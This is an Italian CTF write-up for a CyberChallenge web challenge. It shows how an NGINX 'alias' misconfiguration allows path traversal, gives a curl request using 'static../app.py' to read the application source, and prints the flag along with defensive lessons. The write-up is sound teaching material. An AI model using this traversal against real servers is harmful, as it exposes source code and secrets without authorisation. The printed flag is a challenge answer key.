# Writeup: WS_1.08 - not a bug

## Overview
- **Categoria**: Web  
- **Autore**: bonaff  
- **Difficoltà**: 491  
- **Stato**: Up (last checked: 11 minutes ago)  
- **URL**: [http://notabug.challs.cyberchallenge.it/](http://notabug.challs.cyberchallenge.it/)

## Descrizione 📝
La challenge presenta un sito web con una configurazione di **NGINX** potenzialmente vulnerabile. In particolare, la direttiva `alias` utilizzata per servire la directory `/srv/app/static/` potrebbe consentire un attacco di **Path Traversal** se non configurata correttamente, permettendo l’accesso a file al di fuori di quella directory.

## Soluzione 🎯

### 1. Analisi dei File di Configurazione
Tra i file allegati, **nginx.conf** contiene una direttiva:
```nginx
location /static {
    alias /srv/app/static/;
    ...
}
```
Se NGINX non gestisce correttamente i percorsi relativi, potrebbe essere possibile uscire dalla cartella `/srv/app/static/` con `..`.

### 2. Sfruttamento del Path Traversal
Si tenta una richiesta HTTP contenente `../` per accedere a file fuori dalla cartella `static`. In particolare, `app.py` si trova in `/srv/app/`. Usando `static..`, costruiamo un percorso che punta a:
```
/srv/app/static/../app.py
```
equivalente a:
```
/srv/app/app.py
```
Proviamo con `curl`:
```bash
curl -v http://notabug.challs.cyberchallenge.it/static../app.py
```
### 3. Lettura del Contenuto
La risposta HTTP restituisce il codice sorgente di `app.py`:
```python
import flask

app = flask.Flask(__name__)
# mmh, a secret
flag = "CCIT{put_4_sl4sh_1n_th0s3_ali4s3s!}"

# this site is still on construction.
# As you can see there is litteraly nothing here

@app.route('/')
def index():
    return flask.render_template('index.html')

if __name__ == '__main__':
    app.run()
```
All’interno troviamo la **flag**:

## Flag 🏁
```
CCIT{put_4_sl4sh_1n_th0s3_ali4s3s!}
```

## Lezioni Apprese 📚
1. **Alias di NGINX**: Se non configurato correttamente, è suscettibile a **Path Traversal**.  
2. **Verifica dei Percorsi**: Anche se si definisce una directory statica, bisogna gestire correttamente caratteri come `..` per evitare che l’utente esca dalla cartella prevista.  
3. **Importanza della Sanitizzazione**: Limitare i percorsi o utilizzare `try_files` con path assoluti può prevenire exploit simili.

## Tools Utilizzati 🛠️
- **Browser / cURL**: Per testare manualmente la vulnerabilità di Path Traversal.  
- **NGINX**: Analisi del file di configurazione.  
- **Docker** (opzionale): Se si è eseguito localmente per riprodurre il setup.

---

*Writeup by Luca Crippa - Last Updated: 2024*
